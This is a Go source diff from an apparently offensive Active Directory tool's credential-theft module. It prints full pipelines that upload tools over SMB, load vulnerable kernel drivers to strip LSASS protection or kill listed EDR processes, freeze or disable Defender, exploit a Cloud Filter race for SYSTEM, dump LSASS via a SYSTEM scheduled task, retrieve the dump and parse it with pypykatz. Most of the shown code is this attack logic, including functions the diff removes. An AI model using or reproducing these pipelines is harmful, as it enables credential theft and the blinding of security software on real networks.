@@ -14,13 +14,6 @@ import (
 )
 
 var acquisitionPipelines = map[string]PipelineDef{
-	"minimal": {
-		Name:        "minimal",
-		Delivery:    "donut",
-		PayloadType: "go-mimikatz",
-		ParseFn:     parseMimikatzOutput,
-		Description: "Donut-wrap go-mimikatz and execute via NetExec SMB on target",
-	},
 	"standard": {
 		Name:        "standard",
 		Delivery:    "donut",
@@ -29,42 +22,18 @@ var acquisitionPipelines = map[string]PipelineDef{
 		ParseFn:     parseMimikatzOutput,
 		Description: "Donut-wrap go-mimikatz, upload via SMB, execute via WMI/WinRM, retrieve output",
 	},
-	"aggressive": {
-		Name:        "aggressive",
-		Delivery:    "bof",
-		PayloadType: "nanodump",
-		RemoteExec:  true,
-		ParseFn:     parseNanodumpOutput,
-		Description: "Upload nanodump via SMB, execute with --fork, retrieve and parse dump",
-	},
-	"bof": {
-		Name:        "bof",
-		Delivery:    "bof",
-		PayloadType: "nanodump",
-		RemoteExec:  true,
-		ParseFn:     parseNanodumpOutput,
-		Description: "BOF-based nanodump via C2 agent (requires active agent on target)",
-	},
-	"fork": {
-		Name:        "fork",
+	"pplshade": {
+		Name:        "pplshade",
 		Delivery:    "exe",
-		PayloadType: "nanodump",
+		PayloadType: "pplshade",
 		RemoteExec:  true,
 		ParseFn:     parseNanodumpOutput,
-		Description: "Upload nanodump.exe via SMB, execute with --fork (clone LSASS), retrieve dump",
+		Description: "Upload PPLShade.exe + driver, strip LSASS PPL protection, dump with nanodump --fork",
 	},
-	"byovd": {
-		Name:        "byovd",
+	"edrfreeze": {
+		Name:        "edrfreeze",
 		Delivery:    "exe",
-		PayloadType: "byovd",
-		RemoteExec:  true,
-		ParseFn:     parseNanodumpOutput,
-		Description: "Upload RTCore64.sys + dump tool via SMB, load driver, patch LSASS PPL, dump",
-	},
-	"coldwer": {
-		Name:        "coldwer",
-		Delivery:    "exe",
-		PayloadType: "coldwer",
+		PayloadType: "edrfreeze",
 		RemoteExec:  true,
 		ParseFn:     parseNanodumpOutput,
 		Description: "Upload EDR-Freeze.exe + nanodump.exe via SMB, freeze EDR for 3s, dump LSASS",
@@ -77,14 +46,6 @@ var acquisitionPipelines = map[string]PipelineDef{
 		ParseFn:     parseNanodumpOutput,
 		Description: "Upload UnDefend.exe + nanodump.exe, kill Defender, fork dump LSASS",
 	},
-	"bluehammer": {
-		Name:        "bluehammer",
-		Delivery:    "exe",
-		PayloadType: "bluehammer",
-		RemoteExec:  true,
-		ParseFn:     parseMimikatzOutput,
-		Description: "Upload FunnyApp.exe, exploit Defender RPC to leak SAM via VSS, extract hashes",
-	},
 	"phantomkiller": {
 		Name:        "phantomkiller",
 		Delivery:    "exe",
@@ -92,14 +53,6 @@ var acquisitionPipelines = map[string]PipelineDef{
 		RemoteExec:  true,
 		ParseFn:     parseNanodumpOutput,
 		Description: "Upload BootRepair.sys + PhantomKiller.exe via SMB, load signed Lenovo driver, kill EDR processes via IOCTL, dump LSASS",
-	},
-	"miniplasma": {
-		Name:        "miniplasma",
-		Delivery:    "exe",
-		PayloadType: "miniplasma",
-		RemoteExec:  true,
-		ParseFn:     parseMimikatzOutput,
-		Description: "Upload MiniPlasma.exe, exploit Cloud Filter API race condition for SYSTEM shell, dump LSASS",
 	},
 	"dcsync": {
 		Name:        "dcsync",
@@ -324,25 +277,12 @@ func RunCredentialAcq(state *core.ADState, profileName string, targetHost string
 	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
 
 	var result *core.ToolResult
+
 	switch profileName {
-	case "minimal":
-		result = executeMimikatzPipeline(state, host, pipeline, exec)
 	case "standard":
 		result = executeMimikatzPipeline(state, host, pipeline, exec)
-	case "aggressive", "bof", "fork":
-		result = executeNanodumpPipeline(state, host, pipeline, exec)
-	case "byovd":
-		result = executeBYOVDPipeline(state, host, pipeline, exec)
-	case "coldwer":
-		result = executeColdWerPipeline(state, host, pipeline, exec)
-	case "undefend":
+	case "bypass", "undefend":
 		result = executeUnDefendPipeline(state, host, pipeline, exec)
-	case "bluehammer":
-		result = executeBlueHammerPipeline(state, host, pipeline, exec)
-	case "phantomkiller":
-		result = executePhantomKillerPipeline(state, host, pipeline, exec)
-	case "miniplasma":
-		result = executeMiniPlasmaPipeline(state, host, pipeline, exec)
 	case "dcsync":
 		result = executeDCSyncPipeline(state, host, pipeline, exec)
 	default:
@@ -584,132 +524,7 @@ func executeNanodumpPipeline(state *core.ADState, host core.Host, pipeline Pipel
 	return result
 }
 
-func executeBYOVDPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-	domain, _, pass, _ := getCredential(state)
-
-	if domain == "" || pass == "" {
-		fmt.Println("[!] No credentials for BYOVD pipeline")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error",
-			Value:     "no credentials",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	ctx := context.Background()
-
-	fmt.Println("[*] BYOVD: Deploying RTCore64.sys (randomized name)...")
-	drvR := exec.Execute(ctx, core.Action{
-		Artifact: "RTCore64.sys", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !drvR.Success {
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error", Value: "driver upload failed: " + drvR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	driverPath := drvR.Output
-
-	fmt.Println("[*] BYOVD: Deploying nanodump.exe (randomized name)...")
-	dmpR := exec.Execute(ctx, core.Action{
-		Artifact: "nanodump.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !dmpR.Success {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{driverPath}, Timeout: 15 * time.Second,
-		})
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error", Value: "nanodump upload failed: " + dmpR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	dumperPath := dmpR.Output
-
-	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_byovd_%d.dmp`, time.Now().UnixNano())
-
-	defer func() {
-		exec.Execute(ctx, core.Action{
-			Artifact: `sc stop RTCore64`, Method: "command", Timeout: 15 * time.Second,
-		})
-		time.Sleep(1 * time.Second)
-		exec.Execute(ctx, core.Action{
-			Artifact: `sc delete RTCore64`, Method: "command", Timeout: 15 * time.Second,
-		})
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{driverPath, dumperPath, dumpRemote},
-			Timeout: 30 * time.Second,
-		})
-	}()
-
-	fmt.Println("[*] BYOVD: Loading kernel driver...")
-	loadCmd := fmt.Sprintf(`sc create RTCore64 binPath=%s type=kernel && sc start RTCore64`, driverPath)
-	loadR := exec.Execute(ctx, core.Action{
-		Artifact: loadCmd, Method: "command", Timeout: 30 * time.Second,
-	})
-	if !loadR.Success {
-		fmt.Println("[!] Driver load failed")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error", Value: "driver load failed",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	fmt.Println("[*] BYOVD: Dumping LSASS via nanodump --fork...")
-	dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
-	dumpR := exec.Execute(ctx, core.Action{
-		Artifact: dumpCmd, Method: "command", Timeout: 60 * time.Second,
-	})
-	if !dumpR.Success {
-		fmt.Println("[!] Dump failed")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "byovd", Key: "error", Value: "dump failed",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	fmt.Println("[*] BYOVD: Retrieving dump...")
-	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_byovd_%d.dmp", time.Now().UnixNano()))
-	getR := exec.Execute(ctx, core.Action{
-		Artifact: dumpRemote, Method: "get",
-		Arguments: []string{localDump}, Timeout: 60 * time.Second,
-	})
-	if getR.Success {
-		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
-		if pyr.Success {
-			creds := pipeline.ParseFn(pyr.Stdout)
-			result.Creds = append(result.Creds, creds...)
-			for _, c := range creds {
-				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-					Source: "byovd", Key: c.Username + "@" + c.Domain,
-					Value: c.Secret, Confidence: 0.85, RawOutput: pyr.Stdout,
-					Timestamp: time.Now(),
-				})
-			}
-		}
-	}
-	return result
-}
-
-func runDefenderKill(ctx context.Context, exec core.Executor, target tools.NetExecTarget) {
+func runDefenderKill(ctx context.Context, exec core.Executor, _ tools.NetExecTarget) {
 	if !tools.UnDefend.Available() {
 		fmt.Println("[!] UnDefend.exe not found locally, skipping Defender kill")
 		return
@@ -817,206 +632,6 @@ func executeUnDefendPipeline(state *core.ADState, host core.Host, pipeline Pipel
 				})
 			}
 		}
-	}
-	return result
-}
-
-func executeBlueHammerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-	domain, user, pass, hash := getCredential(state)
-
-	if domain == "" || pass == "" {
-		fmt.Println("[!] No credentials for BlueHammer pipeline")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "bluehammer", Key: "error",
-			Value:     "no credentials",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	target := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP,
-		Domain: domain, Username: user, Password: pass, Hash: hash,
-	}
-
-	if !tools.BlueHammer.Available() {
-		fmt.Println("[!] FunnyApp.exe (BlueHammer) not available, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-
-	ctx := context.Background()
-	fmt.Println("[*] BlueHammer: Deploying FunnyApp.exe (randomized name)...")
-	deployR := exec.Execute(ctx, core.Action{
-		Artifact: "FunnyApp.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !deployR.Success {
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "bluehammer", Key: "error",
-			Value:     "deploy failed: " + deployR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	remotePath := deployR.Output
-	defer func() {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{remotePath}, Timeout: 15 * time.Second,
-		})
-	}()
-
-	fmt.Println("[*] BlueHammer: Executing Defender RPC exploit (start /B)...")
-	execR, err := tools.BlueHammer.ExecRemote(ctx, target, remotePath)
-	if err != nil || execR == nil || !execR.Success {
-		result.Success = false
-		errMsg := "execution failed"
-		if err != nil {
-			errMsg = err.Error()
-		} else if execR != nil {
-			errMsg = execR.Stderr
-		}
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "bluehammer", Key: "sam_leak",
-			Value:      "BlueHammer execution failed: " + errMsg,
-			Confidence: 0.0, Timestamp: time.Now(),
-		})
-		return result
-	}
-	result.Evidence = append(result.Evidence, core.EvidenceEntry{
-		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-		Source: "bluehammer", Key: "sam_leak",
-		Value:      "BlueHammer executed. Check target for SAM output.",
-		Confidence: 0.5, RawOutput: execR.Stdout,
-		Timestamp: time.Now(),
-	})
-	return result
-}
-
-func executeColdWerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-	domain, user, pass, hash := getCredential(state)
-
-	if domain == "" || pass == "" {
-		fmt.Println("[!] No credentials for ColdWer pipeline, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-
-	target := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP,
-		Domain: domain, Username: user, Password: pass, Hash: hash,
-	}
-
-	ctx := context.Background()
-	runDefenderKill(ctx, exec, target)
-
-	fmt.Println("[*] ColdWer: Deploying EDR-Freeze.exe (randomized name)...")
-	freezerR := exec.Execute(ctx, core.Action{
-		Artifact: "EDR-Freeze.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !freezerR.Success {
-		fmt.Printf("[!] Failed to deploy EDR-Freeze.exe — falling back to nanodump\n")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-	freezerPath := freezerR.Output
-
-	fmt.Println("[*] ColdWer: Deploying nanodump.exe (randomized name)...")
-	dmpR := exec.Execute(ctx, core.Action{
-		Artifact: "nanodump.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !dmpR.Success {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{freezerPath}, Timeout: 15 * time.Second,
-		})
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "coldwer", Key: "error",
-			Value:     "nanodump upload failed: " + dmpR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	dumperPath := dmpR.Output
-	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_frozen_%d.dmp`, time.Now().UnixNano())
-	defer func() {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{freezerPath, dumperPath, dumpRemote},
-			Timeout: 30 * time.Second,
-		})
-	}()
-
-	edrProcs := []string{"MsMpEng.exe", "SentinelAgent.exe", "CrowdStrike.exe",
-		"Cylance.exe", "Sophos.exe", "TaniumClient.exe", "S1.exe"}
-
-	dumped := false
-	for _, proc := range edrProcs {
-		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
-		pidR := exec.Execute(ctx, core.Action{
-			Artifact: pidCmd, Method: "command", Timeout: 30 * time.Second,
-		})
-		if pidR.Success && strings.TrimSpace(pidR.Output) != "" {
-			pid := strings.TrimSpace(pidR.Output)
-			if !isNumeric(pid) {
-				fmt.Printf("[!] Invalid PID from remote: %q, skipping\n", pid)
-				continue
-			}
-			fmt.Printf("[*] ColdWer: Found %s PID %s, freezing for 3s...\n", proc, pid)
-			freezeCmd := fmt.Sprintf(`%s %s 3000`, freezerPath, pid)
-			freezeR := exec.Execute(ctx, core.Action{
-				Artifact: freezeCmd, Method: "command", Timeout: 30 * time.Second,
-			})
-			if freezeR.Success {
-				time.Sleep(1 * time.Second)
-				fmt.Println("[*] ColdWer: Dumping LSASS during freeze window...")
-				dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
-				dumpR := exec.Execute(ctx, core.Action{
-					Artifact: dumpCmd, Method: "command", Timeout: 60 * time.Second,
-				})
-				if dumpR.Success {
-					dumped = true
-					break
-				}
-				fmt.Printf("[!] ColdWer: dump failed during %s freeze, trying next EDR\n", proc)
-			}
-		}
-	}
-
-	if !dumped {
-		fmt.Println("[!] ColdWer: No EDR found to freeze, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-
-	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_frozen_%d.dmp", time.Now().UnixNano()))
-	getR := exec.Execute(ctx, core.Action{
-		Artifact: dumpRemote, Method: "get",
-		Arguments: []string{localDump}, Timeout: 60 * time.Second,
-	})
-	if getR.Success {
-		fmt.Println("[*] ColdWer: Parsing dump with pypykatz...")
-		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
-		if pyr.Success {
-			creds := pipeline.ParseFn(pyr.Stdout)
-			result.Creds = append(result.Creds, creds...)
-			for _, c := range creds {
-				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-					Source: "coldwer", Key: c.Username + "@" + c.Domain,
-					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
-					Timestamp: time.Now(),
-				})
-			}
-		}
-	} else {
-		fmt.Println("[!] No frozen dump retrieved, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
 	}
 	return result
 }
@@ -1215,278 +830,6 @@ func sanitizeMimikatzCommand(cmd string) string {
 	return string(safe)
 }
 
-func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-	domain, user, pass, hash := getCredential(state)
-
-	if domain == "" || pass == "" {
-		fmt.Println("[!] No credentials for PhantomKiller pipeline")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "phantomkiller", Key: "error",
-			Value:     "no credentials",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	target := tools.NetExecTarget{
-		Protocol: "smb", Host: host.IP,
-		Domain: domain, Username: user, Password: pass, Hash: hash,
-	}
-
-	if !tools.PhantomKiller.Available() {
-		fmt.Println("[!] PhantomKiller not available, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-
-	ctx := context.Background()
-
-	fmt.Println("[*] PhantomKiller: Deploying BootRepair.sys (randomized name)...")
-	drvR := exec.Execute(ctx, core.Action{
-		Artifact: "BootRepair.sys", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !drvR.Success {
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "phantomkiller", Key: "error",
-			Value:     "driver upload failed: " + drvR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	driverPath := drvR.Output
-
-	fmt.Println("[*] PhantomKiller: Deploying PhantomKiller.exe (randomized name)...")
-	klrR := exec.Execute(ctx, core.Action{
-		Artifact: "PhantomKiller.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !klrR.Success {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{driverPath}, Timeout: 15 * time.Second,
-		})
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "phantomkiller", Key: "error",
-			Value:     "killer upload failed: " + klrR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	killerPath := klrR.Output
-
-	defer func() {
-		exec.Execute(ctx, core.Action{
-			Artifact: `sc.exe stop PhantomKiller`, Method: "command", Timeout: 15 * time.Second,
-		})
-		time.Sleep(2 * time.Second)
-		exec.Execute(ctx, core.Action{
-			Artifact: `sc.exe delete PhantomKiller`, Method: "command", Timeout: 15 * time.Second,
-		})
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: []string{driverPath, killerPath},
-			Timeout: 30 * time.Second,
-		})
-	}()
-
-	fmt.Println("[*] PhantomKiller: Loading kernel driver...")
-	loadCmd := fmt.Sprintf(`sc.exe create PhantomKiller binPath="%s" type=kernel && sc.exe start PhantomKiller`, driverPath)
-	loadR := exec.Execute(ctx, core.Action{
-		Artifact: loadCmd, Method: "command", Timeout: 30 * time.Second,
-	})
-	if !loadR.Success {
-		fmt.Println("[!] Failed to load PhantomKiller driver")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "phantomkiller", Key: "error",
-			Value:     "failed to load driver",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	fmt.Println("[*] PhantomKiller: Enumerating EDR processes...")
-	edrProcs := []string{"MsMpEng.exe", "CSFalconService.exe", "SentinelService.exe", "CylanceSvc.exe",
-		"SophosMgr.exe", "TaniumClient.exe", "CarbonBlack.exe", "CrowdStrike.exe", "McAfee.exe", "Symantec.exe"}
-	for _, proc := range edrProcs {
-		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
-		pidR := exec.Execute(ctx, core.Action{
-			Artifact: pidCmd, Method: "command", Timeout: 30 * time.Second,
-		})
-		if pidR.Success && strings.TrimSpace(pidR.Output) != "" {
-			pid := strings.TrimSpace(pidR.Output)
-			if !isNumeric(pid) {
-				fmt.Printf("[!] PhantomKiller: Invalid PID from remote: %q, skipping\n", pid)
-				continue
-			}
-			fmt.Printf("[*] PhantomKiller: Found %s PID %s, killing via IOCTL...\n", proc, pid)
-			pidInt := 0
-			fmt.Sscanf(pid, "%d", &pidInt)
-			if pidInt > 0 {
-				tools.PhantomKiller.ExecRemote(ctx, target, killerPath, tools.PhantomKillerModeKill, pidInt)
-			}
-		}
-	}
-
-	fmt.Println("[*] PhantomKiller: Dumping LSASS with nanodump...")
-	dump := executeNanodumpPipeline(state, host, pipeline, exec)
-	result.Success = dump.Success
-	result.Evidence = append(result.Evidence, dump.Evidence...)
-	result.Creds = append(result.Creds, dump.Creds...)
-
-	return result
-}
-
-func executeMiniPlasmaPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
-	result := &core.ToolResult{Success: true}
-	domain, _, pass, _ := getCredential(state)
-
-	if domain == "" || pass == "" {
-		fmt.Println("[!] No credentials for MiniPlasma pipeline")
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "miniplasma", Key: "error",
-			Value:     "no credentials",
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-
-	if !tools.MiniPlasma.Available() {
-		fmt.Println("[!] MiniPlasma not available, falling back to nanodump")
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-
-	ctx := context.Background()
-
-	fmt.Println("[*] MiniPlasma: Deploying dependency DLLs (NtApiDotNet + TaskScheduler)...")
-	var depPaths []string
-	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
-		depR := exec.Execute(ctx, core.Action{
-			Artifact: lib, Method: "put",
-			Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-		})
-		if !depR.Success {
-			exec.Execute(ctx, core.Action{
-				Method: "cleanup", Arguments: depPaths, Timeout: 15 * time.Second,
-			})
-			result.Success = false
-			result.Evidence = append(result.Evidence, core.EvidenceEntry{
-				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-				Source: "miniplasma", Key: "deploy_error",
-				Value:     lib + " deploy failed: " + depR.Error,
-				Timestamp: time.Now(),
-			})
-			return result
-		}
-		depPaths = append(depPaths, depR.Output)
-	}
-
-	fmt.Println("[*] MiniPlasma: Deploying MiniPlasma.exe (randomized name)...")
-	expR := exec.Execute(ctx, core.Action{
-		Artifact: "MiniPlasma.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !expR.Success {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: depPaths, Timeout: 15 * time.Second,
-		})
-		result.Success = false
-		result.Evidence = append(result.Evidence, core.EvidenceEntry{
-			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-			Source: "miniplasma", Key: "error",
-			Value:     "exploit upload failed: " + expR.Error,
-			Timestamp: time.Now(),
-		})
-		return result
-	}
-	exploitPath := expR.Output
-
-	fmt.Println("[*] MiniPlasma: Deploying nanodump.exe (randomized name)...")
-	dmpR := exec.Execute(ctx, core.Action{
-		Artifact: "nanodump.exe", Method: "put",
-		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
-	})
-	if !dmpR.Success {
-		allPaths := append(depPaths, exploitPath)
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: allPaths, Timeout: 30 * time.Second,
-		})
-		return executeNanodumpPipeline(state, host, pipeline, exec)
-	}
-	dumperPath := dmpR.Output
-
-	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_eop_%d.dmp`, time.Now().UnixNano())
-	allPaths := append(append(depPaths, exploitPath, dumperPath), dumpRemote)
-	defer func() {
-		exec.Execute(ctx, core.Action{
-			Method: "cleanup", Arguments: allPaths, Timeout: 30 * time.Second,
-		})
-	}()
-
-	fmt.Println("[*] MiniPlasma: Executing Cloud Filter EoP exploit (run)...")
-	execR := exec.Execute(ctx, core.Action{
-		Artifact: exploitPath, Method: "run", Timeout: 60 * time.Second,
-	})
-	if !execR.Success {
-		fmt.Println("[!] MiniPlasma exploit did not return success")
-		result.Success = false
-		return result
-	}
-
-	fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS as SYSTEM via schtasks...")
-	dumpCmd := fmt.Sprintf(
-		`schtasks /create /tn "MiniDump" /tr "%s --write %s --fork" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn "MiniDump" && ping -n 6 127.0.0.1 >NUL && schtasks /delete /tn "MiniDump" /f`,
-		dumperPath, dumpRemote)
-	execDumpR := exec.Execute(ctx, core.Action{
-		Artifact: dumpCmd, Method: "command", Timeout: 90 * time.Second,
-	})
-	if !execDumpR.Success {
-		fmt.Printf("[!] MiniPlasma: schtasks dump failed (err=%s)\n", execDumpR.Error)
-		result.Success = false
-		return result
-	}
-
-	fmt.Println("[*] MiniPlasma: Retrieving SYSTEM-level dump via SMB...")
-	localDump := fmt.Sprintf("/tmp/lsass_eop_%d.dmp", time.Now().UnixNano())
-	getR := exec.Execute(ctx, core.Action{
-		Artifact: dumpRemote, Method: "get",
-		Arguments: []string{localDump}, Timeout: 60 * time.Second,
-	})
-	if getR.Success {
-		fmt.Println("[*] MiniPlasma: Parsing dump with pypykatz...")
-		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
-		if pyr.Success {
-			creds := pipeline.ParseFn(pyr.Stdout)
-			result.Creds = append(result.Creds, creds...)
-			for _, c := range creds {
-				result.Evidence = append(result.Evidence, core.EvidenceEntry{
-					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-					Source: "miniplasma", Key: c.Username + "@" + c.Domain,
-					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
-					Timestamp: time.Now(),
-				})
-			}
-		}
-	}
-
-	result.Evidence = append(result.Evidence, core.EvidenceEntry{
-		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
-		Source: "miniplasma", Key: "eop",
-		Value:      "MiniPlasma SYSTEM shell achieved",
-		Confidence: 0.7, RawOutput: execR.Output,
-		Timestamp: time.Now(),
-	})
-	return result
-}
-
 func executeDCSyncPipeline(state *core.ADState, _ core.Host, _ PipelineDef, _ core.Executor) *core.ToolResult {
 	result := &core.ToolResult{Success: true}
 
@@ -1576,13 +919,4 @@ func executeDCSyncPipeline(state *core.ADState, _ core.Host, _ PipelineDef, _ co
 
 	fmt.Printf("[*] DCSync complete: %d DA credentials synced\n", synced)
 	return result
-}
-
-func isNumeric(s string) bool {
-	for _, r := range s {
-		if !unicode.IsDigit(r) {
-			return false
-		}
-	}
-	return s != ""
 }
